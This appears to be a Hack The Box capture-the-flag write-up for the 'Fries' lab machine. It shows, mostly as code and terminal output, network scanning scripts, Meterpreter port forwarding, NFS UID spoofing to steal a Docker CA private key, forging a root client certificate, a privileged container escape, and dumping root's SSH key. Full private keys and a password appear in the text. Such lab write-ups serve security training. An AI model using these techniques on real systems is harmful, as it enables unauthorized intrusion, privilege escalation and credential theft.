PORTS = [22, 80, 443, 5000, 8080, 3306, 21, 23, 25, 110]  # common ports

def get_networks():
    networks = []
    with os.popen("ip route") as f:
        lines = f.read().splitlines()

    for line in lines:
        parts = line.split()
        # Look for CIDR blocks like 172.18.0.0/16 or 198.51.100.0/24
        if "/" in parts[0]:
            try:
                net = ipaddress.ip_network(parts[0], strict=False)
                networks.append(net)
            except:
                pass

    return networks

def scan_port(ip, port):
    s = socket.socket()
    s.settimeout(TIMEOUT)
    try:
        s.connect((str(ip), port))
        s.close()
        return port
    except:
        return None

def scan_host(ip):
    open_ports = []
    for port in PORTS:
        if scan_port(ip, port):
            open_ports.append(port)
    if open_ports:
        print(f"{ip} -> {open_ports}")

def main():
    networks = get_networks()
    print("[+] Networks detected:")
    for net in networks:
        print("  -", net)

    print("\n[*] Starting scan...\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as exe:
        for net in networks:
            for ip in net.hosts():
                exe.submit(scan_host, ip)

    print("\n[+] Scan complete.")

main()
```

Automatically reads all networks from `ip route`
Scans only common useful ports
Prints only reachable hosts + open ports

```bash
cb46692a4590:/tmp/portforw$ python3 scanner.py 
[+] Networks detected:
  - 172.18.0.0/16

[*] Starting scan...

172.18.0.4 -> [80]
172.18.0.5 -> [22]
172.18.0.1 -> [22, 80, 443]
172.18.0.2 -> [5000]
```

Now we blind scan unknown networks like 198.168.100.x:

```bash
cb46692a4590:/$ python3 - << 'EOF'
import socket
import concurrent.futures

TIMEOUT = 0.1
THREADS = 200
PORT = 80

def check(ip):
    s = socket.socket()
    s.settimeout(TIMEOUT)
    try:
        s.connect((ip, PORT))
        s.close()
        print("[+] REACHABLE:", ip)
    except:
        pass

prefix = "192.168.100"
ips = [f"{prefix}.{i}" for i in range(1,255)]

with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as exe:
    exe.map(check, ips)
EOF
[+] REACHABLE: 192.168.100.2
```

Scan ports (1–1024) on 192.168.100.2, list open ports, grab banners:

```bash
python3 - << 'EOF'
import socket
import concurrent.futures

TARGET = "192.168.100.2"
TIMEOUT = 0.2
THREADS = 300
PORT_RANGE = range(1, 1025)   # first sweep (1–1024)

open_ports = []

def scan_port(port):
    s = socket.socket()
    s.settimeout(TIMEOUT)
    try:
        s.connect((TARGET, port))
        s.close()
        return port
    except:
        return None

def grab_banner(port):
    try:
        s = socket.socket()
        s.settimeout(0.5)
        s.connect((TARGET, port))
        try:
            # trigger banner if possible
            s.sendall(b"\r\n\r\n")
        except:
            pass
        data = s.recv(256)
        s.close()
        return data.decode(errors="ignore").strip()
    except:
        return ""

print(f"[*] Scanning {TARGET} ports 1-1024...\n")

# ------------------- PORT SCAN ------------------- #
with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as exe:
    for result in exe.map(scan_port, PORT_RANGE):
        if result:
            open_ports.append(result)
            print(f"[+] OPEN PORT: {result}")

print("\n[+] Port scan complete.")
print("[+] Open ports found:", open_ports)

# ------------------- BANNER GRAB ------------------- #
print("\n[*] Grabbing banners...\n")

services = {}

for port in open_ports:
    banner = grab_banner(port)
    if banner:
        services[port] = banner
        print(f"[{port}] {banner}")
    else:
        print(f"[{port}] (no banner)")

print("\n[*] SUMMARY")
print("Open Ports & Services:")
for port in open_ports:
    b = services.get(port, "Unknown / No Banner")
    print(f" - {port}: {b}")

EOF


[*] Scanning 192.168.100.2 ports 1-1024...

[+] OPEN PORT: 22
[+] OPEN PORT: 80
[+] OPEN PORT: 111
[+] OPEN PORT: 443

[+] Port scan complete.
[+] Open ports found: [22, 80, 111, 443]

[*] Grabbing banners...

[22] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
[80] (no banner)
[111] (no banner)
[443] (no banner)

[*] SUMMARY
Open Ports & Services:
 - 22: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
 - 80: Unknown / No Banner
 - 111: Unknown / No Banner
 - 443: Unknown / No Banner
```

Scripts break the shell, so running them this way is safer.

We can use the `meterpreter` shell for port forwarding:

```bash
meterpreter > portfwd add -l 5000 -p 22 -r 192.168.100.2
[*] Forward TCP relay created: (local) :5000 -> (remote) 192.168.100.2:22

meterpreter > portfwd list

Active Port Forwards
====================

   Index  Local         Remote            Direction
   -----  -----         ------            ---------
   1      0.0.0.0:5000  192.168.100.2:22  Forward

1 total active port forwards.
```

Now we can [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) to the internal ip as `svc`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fries/user]
└─$ ssh -p 5000 svc@localhost
svc@localhost password: Friesf00Ds2025!!  

svc@web:/home$ env
SHELL=/bin/bash
PWD=/home
LOGNAME=svc
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/svc
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=172.18.0.4 39603 192.168.100.2 22
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=svc
SHLVL=1
XDG_SESSION_ID=53
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=172.18.0.4 39603 22
BUN_INSTALL=/home/svc/.local/share/reflex/bun
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
PATH=/home/svc/.local/share/reflex/bun/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
SSH_TTY=/dev/pts/0
_=/usr/bin/env
OLDPWD=/home/svc

svc@web:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
svc:x:1000:1000:svc:/home/svc:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
_rpc:x:114:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:115:65534::/var/lib/nfs:/usr/sbin/nologin
dnsmasq:x:116:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
barman:x:117:120:Backup and Recovery Manager for PostgreSQL,,,:/var/lib/barman:/bin/bash
sssd:x:118:121:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
```

# Privilege Escalation Linux

https://medium.com/@instatunnel/docker-socket-security-a-critical-vulnerability-guide-76f4137a68c5

```bash
client-cert + client-key + signed by CA  → trusted
```

If you have the CA, you can sign a new certificate, and Docker will trust it, that certificate can then be used to authenticate to the Docker socket and Docker access = **root access** to the host.

This is a security flaw, read also: https://github.com/twistlock/authz/issues/40

We just need to get the certs so we can sign one for the root user:

```bash
svc@web:/$ cat  /var/lib/authz-broker/policy.json
{"name":"policy_1", "users": ["svc"], "actions": ["container_list", "container_logs"]}
{"name":"policy_1", "users": ["sysadm"], "actions": ["container"], "readonly":true}
{"name":"policy_2", "users": ["root"], "actions": [""]}

svc@web:/$ ps aux | grep authz
root         648  0.0  0.2  14764  7160 ?        Ssl  20:04   0:00 /usr/bin/authz-broker
root         925  0.1  2.6 1955936 78152 ?       Ssl  20:04   0:04 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock --authorization-plugin=authz-broker --tlsverify --tlscacert=/etc/docker/certs/ca.pem --tlscert=/etc/docker/certs/server-cert.pem --tlskey=/etc/docker/certs/server-key.pem -H=127.0.0.1:2376
svc        14380  0.0  0.0   6612  2560 pts/0    S+   20:49   0:00 grep --color=auto authz
```

Docker **TLS is enabled**
This means the Docker API requires:
- a client certificate
- signed by the **CA in /etc/docker/certs/ca.pem**

The Docker daemon has its **CA, server cert, and server key** stored locally:

```bash
svc@web:/$ cat /etc/docker/certs/ca.pem
-----BEGIN CERTIFICATE-----
MIIDBzCCAe+gAwIBAgIUSlcqOqok3HQM9woDn1LzVmcwXLUwDQYJKoZIhvcNAQEL
BQAwEzERMA8GA1UEAwwIRG9ja2VyQ0EwHhcNMjUwNTI2MTcxMDU4WhcNMjYwNTI2
MTcxMDU4WjATMREwDwYDVQQDDAhEb2NrZXJDQTCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBAI0j+/mI8H+kt4jlyadQTUFRmwXTmZPUjnwl6KXiOA8avwg1
vf90bV3zKkqTgjdDYVcA6CuUs5VbbN41Yc8ETRqW9MW7w6SR7LtuxdTk3F/fZ1ar
6OKfmCMpOhdsQVTqjjxKllkO5ZW6jtDg3tP/RG/pklOl3mvu7ZVBXpqGoF21Eeg0
JH+eIHIoEsFKoVf7WTAIl27g6oJok1JVQYGP9CYMhL3W+tsXWmTrxjv+5JwxfxDN
6FP/5P9e4GVfHpK64da0hngfl8l+0p92RFQd2QZEJs8X/L/2P8UMN2QGC99O8u7Q
uH2ndupk8zCaLyQ41+wE+BKXULnDD/9Y9xTp76ECAwEAAaNTMFEwHQYDVR0OBBYE
FBrssmkRFMv4JxsJiOROQ5W3X/TlMB8GA1UdIwQYMBaAFBrssmkRFMv4JxsJiORO
Q5W3X/TlMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAFKHOUWX
+q12Vpxg7It+ENlpNarimsTmsrCoRcAkEQnHPQsC2yY3NSMV0ZnYRBx/OtyG++lI
d7af8KU5E8IDbQQTtHWSWy0WD1QbBrIkgnsI48MLTfk/4eDbJ5dM1baEmhK/DEAP
cqGC0GMZ0N600mNysj6QZ+FUfy6YjqZS3HH0hz3yhWwNpaZUCS83H5LPamdX2ET0
9Jto+nDRYvj1hrtDR2aJQ98gTkMlO6QMOefaPeMemo07hBs0dgyWiEmKD8WBxW0h
1LIWU9eWw1kFa27lw/oA4ZaH48K2a4TpAJPfnGGAEQDHA+tytgqUpk+2j6Zb6g11
y9tT1WDrTzwdNtk=
-----END CERTIFICATE-----

svc@web:/$ cat /etc/docker/certs/server-key.pem
cat: /etc/docker/certs/server-key.pem: Permission denied
svc@web:/$ cat /etc/docker/certs/server-cert.pem
-----BEGIN CERTIFICATE-----
MIIDCTCCAfGgAwIBAgIUG5nEEOe5rMudvK9SoSMUDkxjukEwDQYJKoZIhvcNAQEL
BQAwEzERMA8GA1UEAwwIRG9ja2VyQ0EwHhcNMjUwNTI2MTcxMjQyWhcNMjYwNTI2
MTcxMjQyWjAQMQ4wDAYDVQQDDAVmcmllczCCASIwDQYJKoZIhvcNAQEBBQADggEP
ADCCAQoCggEBAJijWsBsMAbc61bgwGH3DfhmmCKFmh7hIcRwhjHqkrhP59IbKC0c
z6e78z41fXXfPTTRaHX/fY9mYDVjphGzsHldlM/ExGqNC3sNz8neZFUGQ5wU3DmP
2Obb7fFdunW7Ja1FMZZsbD4gYyu4zge1SX1br0sJV8TtVayGb095fKwlTJ+jCq5t
WleN++U4h+ZzP7X8CE8ILKBx5eqRbeVcynlyUYFXco0YGyluiHm2jzF5fqikcApc
YmlChVYTwW/MsZoEW8sYVZoUnn5pt2nQeORvlnfS2LUqW1uYjtNG89mS9RM+ho75
rK6TkONizMntJuGs9di118uu8eFDo88m3jcCAwEAAaNYMFYwFAYDVR0RBA0wC4ID
d2VihwR/AAABMB0GA1UdDgQWBBQmv9PLLwJOSaHH1brbMcEsKWtUbjAfBgNVHSME
GDAWgBQa7LJpERTL+CcbCYjkTkOVt1/05TANBgkqhkiG9w0BAQsFAAOCAQEAVmgr
T8Mk6GA9poX30ZZxXezpM3KEF8I2H/7JhRKTqQ6WbkurH49H/t4onVpohyCvubgx
Zsj7n9gIg76EVhEUuKO3KA1XPBWDdhJGTrbgKM8jO2xOAs1uq4NkjTSLTLH8ZIFW
ExqKdkccmXQwhSZZkclfX7FvdLNRr/prNNpOAU4FpEKw+sZEV7O/MXARgZWd2WN2
TArhKXNdqlKcza8jVW6tYM/pIjv8OMBvG/4dj4HeNMD1aR7LzeVLxOGA39ljeFqN
BPAPYGesmQddqXz8LiTfaT6+PbOzSCM67yv7w4LXPAMMvz2ijdI+JdHd8/ikRpcx
spLBZWYBH+iwwkdPFA==
-----END CERTIFICATE-----
```

Check for others certificate files:

```bash
svc@web:/$ ls -l /etc/docker/certs/
total 24
-rw------- 1 root root 1708 May 26 17:10 ca-key.pem
-rw-r--r-- 1 root root 1111 May 26 17:10 ca.pem
-rw-r--r-- 1 root root 1115 May 26 17:12 server-cert.pem
-rw-r--r-- 1 root root  940 May 26 17:12 server.csr
-rw------- 1 root root 1704 May 26 17:12 server-key.pem
-rw-r--r-- 1 root root  205 May 26 17:11 server-openssl.cnf
```

We can't read `ca-key.pem` which is needed, going back to the first docker container, the `NFS` mount is on `172.18.0.1`

To see if any NFS servers exist in reachable networks:

```bash
meterpreter > shell
Process 102 created.
Channel 2 created.

for i in $(seq 1 254); do
  ip="1. 172.18.0.$i"
  timeout 0.3 bash -c "echo > /dev/tcp/$ip/2049" 2>/dev/null && echo "[+] NFS on $ip:2049"
done
[+] NFS on 172.18.0.1:2049
```

We have to `portforward` it so we can mount it from our host (use port 2049): 

```bash
meterpreter > portfwd add -l 2049 -p 2049 -r 172.18.0.1
[*] Forward TCP relay created: (local) :2049 -> (remote) 172.18.0.1:2049

svc@web:/tmp$ mkdir certs
svc@web:/tmp$ cd certs

svc@web:/tmp/certs$ showmount -e 172.18.0.1
Export list for 172.18.0.1:
/srv/web.fries.htb *                           ## This means the share is world‑exported — which is a real misconfiguration.

svc@web:/tmp/certs$ getent group "infra managers"
infra managers:*:59605603:d.cooper,m.hannigan,d.wilson

svc@web:/tmp/certs$ id d.cooper
uid=59602614(d.cooper) gid=59600513(domain users) groups=59600513(domain users),59605603(infra managers)

# Mount
svc@web:/tmp/certs$ which mount
which mount.nfs
/usr/bin/mount
/usr/sbin/mount.nfs

svc@web:/tmp/certs$ rpcinfo -p 172.18.0.1
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  51184  mountd
    100005    1   tcp  56199  mountd
    100005    2   udp  52798  mountd
    100005    2   tcp  47441  mountd
    100005    3   udp  32827  mountd
    100005    3   tcp  36143  mountd
    100024    1   udp  46242  status
    100024    1   tcp  54735  status
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049
    100021    1   udp  37418  nlockmgr
    100021    3   udp  37418  nlockmgr
    100021    4   udp  37418  nlockmgr
    100021    1   tcp  43259  nlockmgr
    100021    3   tcp  43259  nlockmgr
    100021    4   tcp  43259  nlockmgr
    
    meterpreter > portfwd add -l 56199 -p 56199 -r 172.18.0.1
[*] Forward TCP relay created: (local) :56199 -> (remote) 172.18.0.1:56199
meterpreter > portfwd add -l 111 -p 111 -r 172.18.0.1
[*] Forward TCP relay created: (local) :111 -> (remote) 172.18.0.1:111

─$ mkdir ./mnt
─$ sudo mount -t nfs -o vers=4 localhost:/srv/web.fries.htb ./mnt
[sudo] password di mdn0x: 
─$ cd mnt                 

┌──(mdn0x㉿mdn0xKali)-[~/…/Fries/user/ssh/mnt]
└─$ ls
certs  shared  webroot
```

NFS does not use usernames but checks the UID/GID number so make an user account to mimic the IDs of the users allowed to access the `certs` directory:

```bash
id d.cooper
uid=59602614(d.cooper)
gid=59600513(domain users)
groups=59600513(domain users),59605603(infra managers)

─$ sudo useradd -u 59602614 cooper -m
useradd warning: coopers uid 59602614 outside of the UID_MIN 1000 and UID_MAX 60000 range.

─$ sudo su - cooper

$ ls -la /mnt/certs
totale 32
drwxrwx--- 2 root 59605603 4096 26 mag 18.13 .
drw-r-xr-x 5  655 root     4096 28 mag 17.17 ..
-rw-r----- 1 root 59605603 1708 24 nov  2025 ca-key.pem
-rw-r----- 1 root 59605603 1111 24 nov  2025 ca.pem
-rw-r----- 1 root 59605603 1115 24 nov  2025 server-cert.pem
-rw-r----- 1 root 59605603  940 24 nov  2025 server.csr
-rw-r----- 1 root 59605603 1704 24 nov  2025 server-key.pem
-rw-r----- 1 root 59605603  205 24 nov  2025 server-openssl.cnf

$ cat ca-key.pem
-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCNI/v5iPB/pLeI
5cmnUE1BUZsF05mT1I58Jeil4jgPGr8INb3/dG1d8ypKk4I3Q2FXAOgrlLOVW2ze
NWHPBE0alvTFu8Okkey7bsXU5Nxf32dWq+jin5gjKToXbEFU6o48SpZZDuWVuo7Q
4N7T/0Rv6ZJTpd5r7u2VQV6ahqBdtRHoNCR/niByKBLBSqFX+1kwCJdu4OqCaJNS
VUGBj/QmDIS91vrbF1pk68Y7/uScMX8QzehT/+T/XuBlXx6SuuHWtIZ4H5fJftKf
dkRUHdkGRCbPF/y/9j/FDDdkBgvfTvLu0Lh9p3bqZPMwmi8kONfsBPgSl1C5ww//
WPcU6e+hAgMBAAECggEAD6RARYxOkubPTEWjDn7QwP9pPcEQkRiKXenZmaCzc8EU
ELXcA5aElFfhhPhKAxPdksXP9Rx6tn+2Vf32g/nHDb5TDCLd8LwXT0JcfFaMsbdR
fYJ5wbvMIYFtJbFioCWKc9YUSXRkLy7Iqw9wwm/Uxs5M4CZOuwl0nQjskhV/akL/
u3qqOcBcwq0DpZv4Dw6husKcrSlf7q6jU64eJZ2pfZxBalkMRddMvMiUL4lu3Rzz
eUP7Ffjoc9C2EVyC0XtJzT0Ur+lRLdiYS42oJN0O1V8C4+VKw7XB7+o5OW/bUx5w
CFQQ7KfKuB5Mvr+xcz2sPMQ4PL76L+/FSlAgBFk2/QKBgQC3dzdeJEh0Fw3RlwRJ
S7PRS40kVIjRqmEw3RK48K0/B03B08ExMhFZpZ29C+c1ZzWJBV/PYUEUckuYssiq
ELHUlOtoZtxGlWFLFQj0p84CiCFi9qCBVSB/CX5IDCHR5OcFjr9w0q/DTKkUlUZN
QfPHH6DfA1lTV9xY8kg08rhnVwKBgQDE8P2zoDjbugfzLS23xz29WT506JLHvPlk
I4GPuwM8osExSYSePVvGKeGL2E4pkNhFM7ydnsBrygwO+35f/o9MVK6mQz5GD0pA
y2OhAVIjvUTW/PDrpOdjjPy/PjGIKDxSOcAYzIhpxsvOWymUKo6uF0Zrbu46U+jb
bFLn1NFdxwKBgQCACYIpgDbUVdZ+A9+o610V3p0k0p4dfMORX2eWi9jMWOOKNqbo
F2IGZ0+bRHhaS6oP8yE3UE8j3tQlP/hMv5ProPZdCRQHam7ZAFgcrhNWrvxl3WqM
eAVSwyRPUbA0lIQp28J9EXw6VwDU7Yx/lFx2Bfu2R9cKFBIiPQvpb88DxwKBgQCF
S2sbWZVCOq5Iy8pGueaysqWQMR2vbNsLCPEXHAd70diaiFznUTY9cHlE0plMjsmi
RPsjX6BzFCSHO3b0d/H7QtGWnKqYdp7WLhL3lVJH+EGQlVBm3YzzFyi2M90If9sb
+BRpdH3bwf6NY6xHqWo6sGwsKL+64LIZWT7fxG4UXwKBgQCXjc0iXHVgMqo2v11L
9StL0BZc6xs3VL3zn6E/Sf4ptLfOzr1Z31Owk6it2CwH5QMe2237H7DoTaGdkFpF
moYR5629rNQ8dajTcwTK9f3Vm5Yp8YI290ExIovgF4fS2H1od+YD5Hk2qSlUWDEf
lEFleRF3JdlTO+d45SX4WoO0Fg==
-----END PRIVATE KEY-----
```

Delete the created account:

```bash
─$ sudo userdel cooper 
─$ sudo rm -rf /home/cooper/
```

We have `ca-key.pem` so now we can save it and generate a `root-key` and `csr` file:

```bash
─$ openssl genrsa -out root-key.pem 2048
─$ openssl req -new -key root-key.pem -out root.csr -subj "/CN=root"
```

Then sign it with the key:

```bash
─$ cat ext.cnf 
extendedKeyUsage = clientAuth

─$ openssl x509 -req -in root.csr -CA ca.pem -CAkey ca-key.pem \
  -CAcreateserial -out root-cert.pem -days 365 \
  -extfile ext.cnf

Certificate request self-signature ok
subject=CN=root

─$ ls
ca-key.pem  ca.srl   mnt            root.csr      server-cert.pem
ca.pem      ext.cnf  root-cert.pem  root-key.pem  server-key.pem
```

Port forward again:

```bash
meterpreter > portfwd add -l 2376 -p 2376 -r 127.0.0.1
[*] Forward TCP relay created: (local) :2376 -> (remote) 127.0.0.1:2376

meterpreter > portfwd list
Active Port Forwards
====================

   Index  Local         Remote            Direction
   -----  -----         ------            ---------
   1      0.0.0.0:5000  192.168.100.2:22  Forward
   2      0.0.0.0:2049  172.18.0.1:2049   Forward
   3      0.0.0.0:2376  127.0.0.1:2376    Forward

3 total active port forwards.
```

Now transfer the files and reach the `/version` API endpoint:

```bash
svc@web:/tmp/certs$ wget http://10.10.14.21/ca.pem
svc@web:/tmp/certs$ wget http://10.10.14.21/root-key.pem
svc@web:/tmp/certs$ wget http://10.10.14.21/root-cert.pem

svc@web:/tmp/certs$ ls
ca.pem  root-cert.pem  root-key.pem
svc@web:/tmp/certs$ curl --cert root-cert.pem --key root-key.pem --cacert ca.pem \
  https://127.0.0.1:2376/version
{"Platform":{"Name":""},"Components":[{"Name":"Engine","Version":"28.2.2","Details":{"ApiVersion":"1.50","Arch":"amd64","BuildTime":"2025-09-10T14:50:16.000000000+00:00","Experimental":"false","GitCommit":"28.2.2-0ubuntu1~22.04.1","GoVersion":"go1.23.1","KernelVersion":"6.8.0-87-generic","MinAPIVersion":"1.24","Os":"linux"}},{"Name":"containerd","Version":"1.7.28","Details":{"GitCommit":""}},{"Name":"runc","Version":"1.3.3-0ubuntu1~22.04.2","Details":{"GitCommit":""}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":""}}],"Version":"28.2.2","ApiVersion":"1.50","MinAPIVersion":"1.24","GitCommit":"28.2.2-0ubuntu1~22.04.1","GoVersion":"go1.23.1","Os":"linux","Arch":"amd64","KernelVersion":"6.8.0-87-generic","BuildTime":"2025-09-10T14:50:16.000000000+00:00"}
```

Works, this means we have full root access to the Docker daemon, we can spawn a root container:

```bash
svc@web:/tmp/certs$ docker --tlsverify \
  -H=127.0.0.1:2376 \
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  run -it --privileged -v /:/host ubuntu bash
Unable to find image 'ubuntu:latest' locally
docker: Error response from daemon: Get "https://registry-1.docker.io/v2/": dial tcp: lookup registry-1.docker.io on 127.0.0.53:53: server misbehaving

Run 'docker run --help' for more information

svc@web:/tmp/certs$ docker --tlsverify \
  -H=127.0.0.1:2376 \
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  images
REPOSITORY       TAG       IMAGE ID       CREATED         SIZE
<none>           <none>    a35a9aa8056b   5 days ago      513MB
fries-web        latest    192168217481   6 months ago    151MB
postgres         16        616e340baeac   6 months ago    436MB
dpage/pgadmin4   9.1.0     b2e76a3c5433   9 months ago    513MB
pwm/pwm-webapp   latest    6b2bacb1343e   9 months ago    378MB
gitea/gitea      1.22.6    dfd595e2afd4   11 months ago   167MB

svc@web:/tmp/certs$ docker --tlsverify \
  -H=127.0.0.1:2376 \
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  run -it --privileged -v /:/host fries-web bash
root@87679d72baed:/app# cd /root
root@87679d72baed:~# ls
root@87679d72baed:~# cd /app
root@87679d72baed:/app# ls

root@87679d72baed:/# chroot /host
# whoami
root
# ls -la /root
total 52
drwx------  9 root root 4096 Nov 19 19:45 .
drwxr-xr-x 19 root root 4096 May 30 13:35 ..
lrwxrwxrwx  1 root root    9 Nov 12 01:43 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  3 root root 4096 May 27 11:56 .cache
drwxr-xr-x  3 root root 4096 Aug 20  2023 .config
drwxr-xr-x  2 root root 4096 May 26 17:43 .docker
-rw-------  1 root root   35 Nov 19 19:45 .lesshst
drwxr-xr-x  3 root root 4096 Aug 20  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwx------  2 root root 4096 Nov 18 05:29 .ssh
drwxr-xr-x  5 root root 4096 Nov 12 01:28 scripts
drwx------  3 root root 4096 Aug 20  2023 snap
-rw-r--r--  1 root root   34 Nov 24 21:06 user.txt

# cat /root/user.txt
     HTB{REDACTED_FLAG}
```

We finally find user flag here.
## Root Persistence

Grab `id_rsa` and save it: 

```bash
# cd .ssh
# ls
authorized_keys  id_rsa  id_rsa.pub
# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAiKsV1hdrEl+fT0aksyq+3RU7EOXlCZLM0y37FgJQxkOZwaS5+p5v
eyqB/3uU/qf4TOLLV+pRviKaL9JDu4HLKSR26CIHz3x+niCVM2YRSkVCzDyXrGzZCKA/o7
gogdzeG470Xt7Rwe3QMGbjhJQFDK6yBO6mV7yFy7W8AQ4VeP+EstZUlazooYoZJ2Luj8B0
Dpb4chwVMg5DEJA1uwkxIC7djwB7MCRm0pZxkZcl2FeU2RC+qKQyjda3JQmznUAEsZ8hPh
BUB6TbvvXn53GZuYxRCwzcVflkcJindEIwoyogw/vmEwm5sVWix1D3Er7sGtF2+nNmR1L4
Wp1TKu6Vc6g9YNww67G35xKW7R7GHEJ5DKHOV38Xg3F2tALhzxjxV2b9tVnPd775jwHRQz
